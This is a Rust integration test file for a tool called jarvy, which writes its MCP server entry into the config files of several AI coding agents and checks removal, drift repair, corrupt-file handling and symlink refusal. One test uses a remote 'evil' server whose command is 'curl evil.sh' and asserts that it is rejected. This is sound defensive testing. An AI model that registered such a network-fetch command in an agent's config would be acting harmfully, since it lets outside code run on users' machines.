//! End-to-end MCP registration coverage. Mirrors the ai_hooks
//! integration suite but targets each agent's MCP-server config file.

use std::fs;

use jarvy::ai_hooks::ConfigOrigin;
use jarvy::mcp_register::{
    self, McpAgentTarget, McpRegisterConfig, McpRegistrationScope, McpServerSpec,
    McpServerTransport,
};
use tempfile::TempDir;

struct HomeGuard {
    _tmp: TempDir,
    _previous: Vec<(String, Option<String>)>,
}

impl HomeGuard {
    fn new() -> Self {
        let tmp = TempDir::new().unwrap();
        let path = tmp.path().to_string_lossy().to_string();
        let keys = ["HOME", "USERPROFILE"];
        let mut previous = Vec::new();
        for key in keys {
            previous.push((key.to_string(), std::env::var(key).ok()));
            #[allow(unsafe_code)]
            unsafe {
                std::env::set_var(key, &path);
            }
        }
        HomeGuard {
            _tmp: tmp,
            _previous: previous,
        }
    }

    fn path(&self) -> &std::path::Path {
        self._tmp.path()
    }
}

impl Drop for HomeGuard {
    fn drop(&mut self) {
        for (key, value) in &self._previous {
            #[allow(unsafe_code)]
            unsafe {
                match value {
                    Some(v) => std::env::set_var(key, v),
                    None => std::env::remove_var(key),
                }
            }
        }
    }
}

#[test]
#[serial_test::serial(home_env)]
fn registers_jarvy_with_claude_code() {
    let guard = HomeGuard::new();
    let cfg = McpRegisterConfig {
        agents: vec![McpAgentTarget::ClaudeCode],
        scope: McpRegistrationScope::User,
        ..Default::default()
    };
    let report = mcp_register::apply(&cfg).expect("apply succeeds");
    assert!(report.failures.is_empty());
    assert_eq!(report.total_applied(), 1); // just jarvy

    let body =
        fs::read_to_string(guard.path().join(".claude.json")).expect("settings file written");
    assert!(body.contains("\"jarvy\""));
    assert!(body.contains("\"command\":\"jarvy\""));
    assert!(body.contains("\"mcp\""));
    assert!(body.contains("_jarvy_managed_servers"));
}

#[test]
#[serial_test::serial(home_env)]
fn registers_jarvy_with_cursor_user_scope() {
    let guard = HomeGuard::new();
    let cfg = McpRegisterConfig {
        agents: vec![McpAgentTarget::Cursor],
        scope: McpRegistrationScope::User,
        ..Default::default()
    };
    mcp_register::apply(&cfg).expect("apply");
    let body = fs::read_to_string(guard.path().join(".cursor/mcp.json")).expect("written");
    assert!(body.contains("\"mcpServers\""));
    assert!(body.contains("\"jarvy\""));
}

#[test]
#[serial_test::serial(home_env)]
fn registers_jarvy_with_codex_toml() {
    let guard = HomeGuard::new();
    let cfg = McpRegisterConfig {
        agents: vec![McpAgentTarget::Codex],
        scope: McpRegistrationScope::User,
        ..Default::default()
    };
    mcp_register::apply(&cfg).expect("apply");
    let body = fs::read_to_string(guard.path().join(".codex/config.toml")).expect("written");
    assert!(body.contains("[mcp_servers.jarvy]"));
    assert!(body.contains("command = \"jarvy\""));
    assert!(body.contains("_jarvy_managed_servers"));
}

#[test]
#[serial_test::serial(home_env)]
fn registers_jarvy_with_windsurf() {
    let guard = HomeGuard::new();
    let cfg = McpRegisterConfig {
        agents: vec![McpAgentTarget::Windsurf],
        scope: McpRegistrationScope::User,
        ..Default::default()
    };
    mcp_register::apply(&cfg).expect("apply");
    let body = fs::read_to_string(guard.path().join(".codeium/windsurf/mcp_config.json"))
        .expect("written");
    assert!(body.contains("\"jarvy\""));
}

#[test]
#[serial_test::serial(home_env)]
#[cfg(unix)]
fn registers_jarvy_with_cline_under_vscode_global_storage() {
    let guard = HomeGuard::new();
    let cfg = McpRegisterConfig {
        agents: vec![McpAgentTarget::Cline],
        scope: McpRegistrationScope::User,
        ..Default::default()
    };
    mcp_register::apply(&cfg).expect("apply");
    let macos = guard.path().join(
        "Library/Application Support/Code/User/globalStorage/saoudrizwan.claude-dev/settings/cline_mcp_settings.json",
    );
    let linux = guard.path().join(
        ".config/Code/User/globalStorage/saoudrizwan.claude-dev/settings/cline_mcp_settings.json",
    );
    let body = fs::read_to_string(&macos)
        .or_else(|_| fs::read_to_string(&linux))
        .expect("cline settings file written under one of the OS paths");
    assert!(body.contains("\"jarvy\""));
    assert!(body.contains("\"disabled\":false"));
}

#[test]
#[serial_test::serial(home_env)]
fn jarvy_override_changes_command() {
    let guard = HomeGuard::new();
    let mut cfg = McpRegisterConfig {
        agents: vec![McpAgentTarget::ClaudeCode],
        scope: McpRegistrationScope::User,
        ..Default::default()
    };
    cfg.jarvy = Some(jarvy::mcp_register::config::JarvyServerOverride {
        command: Some("/opt/jarvy/bin/jarvy".to_string()),
        args: Some(vec!["mcp".to_string(), "--verbose".to_string()]),
        env: std::collections::BTreeMap::new(),
    });
    mcp_register::apply(&cfg).expect("apply");
    let body = fs::read_to_string(guard.path().join(".claude.json")).unwrap();
    assert!(body.contains("/opt/jarvy/bin/jarvy"));
    assert!(body.contains("--verbose"));
}

#[test]
#[serial_test::serial(home_env)]
fn custom_server_refused_locally_without_opt_in() {
    let _guard = HomeGuard::new();
    let cfg = McpRegisterConfig {
        agents: vec![McpAgentTarget::Cursor],
        scope: McpRegistrationScope::User,
        allow_custom_servers: false,
        servers: vec![McpServerSpec {
            name: "github".to_string(),
            transport: McpServerTransport::Stdio,
            command: Some("gh-mcp".to_string()),
            ..Default::default()
        }],
        ..Default::default()
    };
    let report = mcp_register::apply(&cfg).unwrap();
    assert_eq!(report.refused_custom, vec!["github"]);
    // Jarvy still applied.
    assert_eq!(report.total_applied(), 1);
}

#[test]
#[serial_test::serial(home_env)]
fn custom_server_refused_when_remote_even_with_opt_in() {
    let guard = HomeGuard::new();
    let cfg = McpRegisterConfig {
        agents: vec![McpAgentTarget::ClaudeCode],
        scope: McpRegistrationScope::User,
        allow_custom_servers: true, // remote attempting to broaden
        origin: ConfigOrigin::Remote,
        servers: vec![McpServerSpec {
            name: "evil".to_string(),
            transport: McpServerTransport::Stdio,
            command: Some("curl evil.sh".to_string()),
            ..Default::default()
        }],
        ..Default::default()
    };
    let report = mcp_register::apply(&cfg).unwrap();
    assert_eq!(report.remote_refused, vec!["evil"]);
    let body = fs::read_to_string(guard.path().join(".claude.json")).unwrap();
    assert!(!body.contains("evil"));
    assert!(body.contains("jarvy")); // built-in still landed
}

#[test]
#[serial_test::serial(home_env)]
fn remove_strips_jarvy_entry_but_keeps_user_servers() {
    let guard = HomeGuard::new();
    let settings = guard.path().join(".claude.json");
    fs::write(
        &settings,
        r#"{ "mcpServers": { "user-server": { "command": "user", "args": [] } } }"#,
    )
    .unwrap();

    let cfg = McpRegisterConfig {
        agents: vec![McpAgentTarget::ClaudeCode],
        scope: McpRegistrationScope::User,
        ..Default::default()
    };
    mcp_register::apply(&cfg).expect("apply");
    let with_jarvy = fs::read_to_string(&settings).unwrap();
    assert!(with_jarvy.contains("user-server"));
    assert!(with_jarvy.contains("\"jarvy\""));

    let report = mcp_register::remove(&cfg);
    assert!(report.failures.is_empty());
    let after = fs::read_to_string(&settings).unwrap();
    assert!(after.contains("user-server"));
    assert!(!after.contains("\"jarvy\""));
    assert!(!after.contains("_jarvy_managed_servers"));
}

#[test]
#[serial_test::serial(home_env)]
fn apply_then_check_is_clean() {
    let _guard = HomeGuard::new();
    let cfg = McpRegisterConfig {
        agents: vec![
            McpAgentTarget::ClaudeCode,
            McpAgentTarget::Cursor,
            McpAgentTarget::Codex,
        ],
        scope: McpRegistrationScope::User,
        ..Default::default()
    };
    mcp_register::apply(&cfg).expect("apply");
    for r in mcp_register::check(&cfg) {
        let outcome = r.expect("check ok");
        assert!(
            outcome.is_clean(),
            "agent {:?} drifted after apply: missing={:?} extra={:?}",
            outcome.agent,
            outcome.missing,
            outcome.extra_jarvy
        );
    }
}

#[test]
#[serial_test::serial(home_env)]
fn corrupt_prior_claude_json_surfaces_parse_existing_failure() {
    let guard = HomeGuard::new();
    let path = guard.path().join(".claude.json");
    fs::write(&path, b"{ broken, not json !!}").unwrap();
    let original = fs::read(&path).unwrap();
    let cfg = McpRegisterConfig {
        agents: vec![McpAgentTarget::ClaudeCode],
        scope: McpRegistrationScope::User,
        ..Default::default()
    };
    let report = mcp_register::apply(&cfg).unwrap();
    assert_eq!(report.successes.len(), 0);
    assert_eq!(report.failures.len(), 1);
    assert_eq!(report.failures[0].1.kind(), "parse_existing");
    // Original bytes untouched — atomic write path bailed out cleanly.
    assert_eq!(fs::read(&path).unwrap(), original);
}

#[test]
#[serial_test::serial(home_env)]
fn corrupt_prior_codex_toml_surfaces_parse_toml_failure() {
    let guard = HomeGuard::new();
    let codex_dir = guard.path().join(".codex");
    fs::create_dir_all(&codex_dir).unwrap();
    let path = codex_dir.join("config.toml");
    fs::write(&path, b"[broken\nnot=valid=toml").unwrap();
    let cfg = McpRegisterConfig {
        agents: vec![McpAgentTarget::Codex],
        scope: McpRegistrationScope::User,
        ..Default::default()
    };
    let report = mcp_register::apply(&cfg).unwrap();
    assert_eq!(report.failures.len(), 1);
    assert_eq!(report.failures[0].1.kind(), "parse_toml");
}

#[test]
#[serial_test::serial(home_env)]
fn per_agent_failure_does_not_abort_other_agents() {
    let guard = HomeGuard::new();
    // Seed Claude Code with corrupt JSON so its apply fails; Cursor's
    // apply must still succeed.
    let claude = guard.path().join(".claude.json");
    fs::write(&claude, b"corrupt").unwrap();
    let cfg = McpRegisterConfig {
        agents: vec![McpAgentTarget::ClaudeCode, McpAgentTarget::Cursor],
        scope: McpRegistrationScope::User,
        ..Default::default()
    };
    let report = mcp_register::apply(&cfg).unwrap();
    let claude_failed = report
        .failures
        .iter()
        .any(|(t, _)| *t == McpAgentTarget::ClaudeCode);
    let cursor_ok = report.successes.iter().any(|o| o.agent == "cursor");
    assert!(claude_failed, "claude-code should have failed");
    assert!(
        cursor_ok,
        "cursor should have applied despite claude-code failure"
    );
    assert!(guard.path().join(".cursor/mcp.json").exists());
}

#[test]
#[serial_test::serial(home_env)]
fn concurrent_applies_dont_corrupt_settings() {
    // Tempfile names include pid+nanos so concurrent writers don't race
    // on the same `.jarvy.tmp.` path. Final JSON must parse.
    let guard = HomeGuard::new();
    let cfg_a = McpRegisterConfig {
        agents: vec![McpAgentTarget::ClaudeCode],
        scope: McpRegistrationScope::User,
        ..Default::default()
    };
    let cfg_b = cfg_a.clone();
    let h1 = std::thread::spawn(move || mcp_register::apply(&cfg_a));
    let h2 = std::thread::spawn(move || mcp_register::apply(&cfg_b));
    let r1 = h1.join().unwrap();
    let r2 = h2.join().unwrap();
    assert!(r1.is_ok(), "thread A failed: {r1:?}");
    assert!(r2.is_ok(), "thread B failed: {r2:?}");

    // Read via guard.path(), not dirs::home_dir() — on Windows the
    // latter is Win32-API-based and ignores env vars, so it returns
    // the real user profile while mcp_register writes into the
    // env-var-resolved tempdir. Same shape as the parallel fix in
    // tests/ai_hooks_integration.rs.
    let body =
        fs::read_to_string(guard.path().join(".claude.json")).expect("settings file present");
    let parsed: serde_json::Value =
        serde_json::from_str(&body).expect("settings file must still parse");
    assert!(parsed.get("mcpServers").is_some());
}

#[test]
#[serial_test::serial(home_env)]
fn codex_toml_round_trips_through_apply_then_read() {
    // After apply, the on-disk TOML must parse and contain the expected
    // structure — no half-baked TOML emission.
    let guard = HomeGuard::new();
    let cfg = McpRegisterConfig {
        agents: vec![McpAgentTarget::Codex],
        scope: McpRegistrationScope::User,
        ..Default::default()
    };
    mcp_register::apply(&cfg).expect("apply");
    let path = guard.path().join(".codex/config.toml");
    let body = fs::read_to_string(&path).expect("written");
    let parsed: toml::Value = toml::from_str(&body).expect("emitted TOML must parse back");
    let mcp = parsed
        .as_table()
        .and_then(|t| t.get("mcp_servers"))
        .and_then(|v| v.as_table())
        .expect("mcp_servers table present");
    let jarvy = mcp
        .get("jarvy")
        .and_then(|v| v.as_table())
        .expect("jarvy entry present");
    assert_eq!(jarvy.get("command").and_then(|v| v.as_str()), Some("jarvy"));
    let markers = parsed
        .as_table()
        .and_then(|t| t.get("_jarvy_managed_servers"))
        .and_then(|v| v.as_array())
        .expect("marker array present");
    assert!(markers.iter().any(|v| v.as_str() == Some("jarvy")));
}

#[test]
#[serial_test::serial(home_env)]
fn claude_code_project_scope_writes_to_mcp_json_in_cwd() {
    let _guard = HomeGuard::new();
    let tmp_cwd = TempDir::new().unwrap();
    let prev = std::env::current_dir().unwrap();
    std::env::set_current_dir(tmp_cwd.path()).unwrap();
    let result = (|| {
        let cfg = McpRegisterConfig {
            agents: vec![McpAgentTarget::ClaudeCode],
            scope: McpRegistrationScope::Project,
            ..Default::default()
        };
        mcp_register::apply(&cfg)?;
        let body = fs::read_to_string(tmp_cwd.path().join(".mcp.json"))?;
        assert!(body.contains("\"jarvy\""));
        Ok::<_, Box<dyn std::error::Error>>(())
    })();
    let _ = std::env::set_current_dir(prev);
    result.expect("project-scope apply");
}

#[test]
#[serial_test::serial(home_env)]
fn continue_dev_writes_per_server_yaml_fragment() {
    let _guard = HomeGuard::new();
    let tmp_cwd = TempDir::new().unwrap();
    let prev = std::env::current_dir().unwrap();
    std::env::set_current_dir(tmp_cwd.path()).unwrap();
    let result = (|| {
        let cfg = McpRegisterConfig {
            agents: vec![McpAgentTarget::Continue],
            scope: McpRegistrationScope::Project,
            ..Default::default()
        };
        mcp_register::apply(&cfg)?;
        let body =
            fs::read_to_string(tmp_cwd.path().join(".continue/mcpServers/jarvy.jarvy.yaml"))?;
        assert!(body.contains("schema: v1"));
        assert!(body.contains("- name: \"jarvy\""));
        Ok::<_, Box<dyn std::error::Error>>(())
    })();
    let _ = std::env::set_current_dir(prev);
    result.expect("continue project apply");
}

#[test]
#[serial_test::serial(home_env)]
fn windsurf_project_scope_falls_back_to_user_with_warning() {
    // Windsurf has no project-scope MCP config. The registrar should
    // still write the user-scope file but surface a warning so the user
    // knows about the silent fallback.
    let guard = HomeGuard::new();
    let cfg = McpRegisterConfig {
        agents: vec![McpAgentTarget::Windsurf],
        scope: McpRegistrationScope::Project,
        ..Default::default()
    };
    let report = mcp_register::apply(&cfg).expect("apply");
    assert_eq!(report.successes.len(), 1);
    let outcome = &report.successes[0];
    assert!(
        outcome.warnings.iter().any(|w| w.contains("project-scope")),
        "expected project-scope warning, got {:?}",
        outcome.warnings
    );
    // User-scope file landed regardless.
    assert!(
        guard
            .path()
            .join(".codeium/windsurf/mcp_config.json")
            .exists()
    );
}

#[test]
#[serial_test::serial(home_env)]
fn agents_narrowing_restricts_custom_server() {
    let guard = HomeGuard::new();
    let cfg = McpRegisterConfig {
        agents: vec![McpAgentTarget::ClaudeCode, McpAgentTarget::Cursor],
        scope: McpRegistrationScope::User,
        allow_custom_servers: true,
        servers: vec![McpServerSpec {
            name: "github".to_string(),
            transport: McpServerTransport::Stdio,
            command: Some("gh-mcp".to_string()),
            agents: vec![McpAgentTarget::Cursor],
            ..Default::default()
        }],
        ..Default::default()
    };
    mcp_register::apply(&cfg).expect("apply");
    // Only Cursor should have `github`.
    let claude = fs::read_to_string(guard.path().join(".claude.json")).unwrap();
    let cursor = fs::read_to_string(guard.path().join(".cursor/mcp.json")).unwrap();
    assert!(claude.contains("\"jarvy\""));
    assert!(!claude.contains("\"github\""));
    assert!(cursor.contains("\"jarvy\""));
    assert!(cursor.contains("\"github\""));
}

#[test]
#[serial_test::serial(home_env)]
fn re_apply_after_drift_brings_settings_back_to_clean() {
    let guard = HomeGuard::new();
    let cfg = McpRegisterConfig {
        agents: vec![McpAgentTarget::ClaudeCode],
        scope: McpRegistrationScope::User,
        ..Default::default()
    };
    mcp_register::apply(&cfg).expect("first apply");
    // Mutate on-disk file to simulate drift. Use guard.path() not
    // dirs::home_dir() — Windows dirs::home_dir() ignores env vars
    // (Win32 API) and would point at the real user profile.
    let path = guard.path().join(".claude.json");
    fs::write(&path, b"{ \"hello\": \"world\" }").unwrap();
    // Re-apply restores jarvy entry without nuking the unrelated key.
    mcp_register::apply(&cfg).expect("second apply");
    let body = fs::read_to_string(&path).unwrap();
    assert!(body.contains("\"jarvy\""));
    assert!(body.contains("\"hello\""));
    // Check now reports clean.
    for r in mcp_register::check(&cfg) {
        let outcome = r.expect("check ok");
        assert!(outcome.is_clean());
    }
}

#[cfg(unix)]
#[test]
#[serial_test::serial(home_env)]
fn settings_symlink_is_refused() {
    let guard = HomeGuard::new();
    let target = guard.path().join("real.json");
    fs::write(&target, b"{}").unwrap();
    let link = guard.path().join(".claude.json");
    std::os::unix::fs::symlink(&target, &link).unwrap();

    let cfg = McpRegisterConfig {
        agents: vec![McpAgentTarget::ClaudeCode],
        scope: McpRegistrationScope::User,
        ..Default::default()
    };
    let report = mcp_register::apply(&cfg).unwrap();
    assert_eq!(report.failures.len(), 1);
    assert_eq!(report.failures[0].1.kind(), "settings_path_is_symlink");
    assert_eq!(fs::read(&target).unwrap(), b"{}");
}
